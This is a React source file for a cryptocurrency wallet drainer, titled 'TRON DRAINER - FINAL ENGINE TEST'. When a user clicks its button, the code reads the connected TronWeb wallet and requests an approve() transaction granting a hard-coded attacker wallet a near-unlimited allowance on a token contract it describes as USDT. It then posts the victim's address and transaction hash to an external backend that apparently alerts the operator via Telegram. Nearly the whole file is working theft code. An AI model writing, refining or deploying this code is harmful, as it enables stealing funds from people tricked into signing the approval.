import React, { useState } from "react";

// CONFIGURATION
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; 
const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou"; // Your Account 01
const BACKEND = "https://qr-drainer.onrender.com";

export default function App() {
  const [status, setStatus] = useState("Idle");
  const [logs, setLogs] = useState([]);

  const addLog = (msg) => setLogs(prev => [...prev, `${new Date().toLocaleTimeString()}: ${msg}`]);

  const handleDrain = async () => {
    setStatus("Starting...");
    addLog("Process started.");

    if (!window.tronWeb || !window.tronWeb.defaultAddress) {
      addLog("ERROR: TronWeb not detected.");
      setStatus("Failed: Wallet not connected");
      return;
    }

    // 1. VALIDATE ADDRESS
    if (!window.tronWeb.isAddress(ATTACKER_WALLET)) {
      addLog(`FATAL: ATTACKER_WALLET is invalid!`);
      setStatus("Failed: Invalid Attacker Address");
      return;
    }
    addLog(`Attacker Address Validated: ${ATTACKER_WALLET}`);

    const victimAddress = window.tronWeb.defaultAddress.base58;
    addLog(`Connected (Victim): ${victimAddress}`);

    try {
      setStatus("Loading Token Contract...");
      addLog("Connecting to USDT Contract...");
      
      // 2. THE BULLETPROOF METHOD
      // This automatically handles all Hex encoding and ABI formatting.
      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      addLog("Contract loaded successfully.");

      setStatus("Requesting Signature...");
      addLog("Sending approve transaction to wallet...");
      
      // This triggers the TronLink popup and handles the signing/broadcasting
      const tx = await contract.approve(ATTACKER_WALLET, "1000000000000000").send({
        feeLimit: 100000000, // 100 TRX fee limit
        from: victimAddress
      });

      addLog(`Transaction Broadcasted! TX ID: ${tx}`);
      setStatus("Success! Alerting Backend...");

      // 3. ALERT BACKEND
      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          victimAddress: victimAddress,
          txHash: tx,
          network: "TRON Shasta"
        })
      });

      addLog("Backend alerted. Check Telegram.");
      setStatus("✅ DRAIN COMPLETE. Check Telegram.");

    } catch (error) {
      console.error(error);
      addLog(`FATAL ERROR: ${error.message}`);
      setStatus(`Failed: ${error.message}`);
    }
  };

  return (
    <div style={{ padding: "40px", fontFamily: "monospace", background: "#000", color: "#0f0", minHeight: "100vh" }}>
      <h1>TRON DRAINER - FINAL ENGINE TEST</h1>
      <p>Current Status: <strong>{status}</strong></p>
      
      <button 
        onClick={handleDrain} 
        style={{ padding: "20px", fontSize: "20px", background: "red", color: "white", border: "none", cursor: "pointer", marginBottom: "20px" }}
      >
        EXECUTE DRAIN (APPROVE)
      </button>

      <div style={{ background: "#111", padding: "20px", border: "1px solid #333" }}>
        <h3>System Logs:</h3>
        {logs.map((log, i) => <div key={i} style={{marginBottom: "5px"}}>{log}</div>)}
      </div>
    </div>
  );
}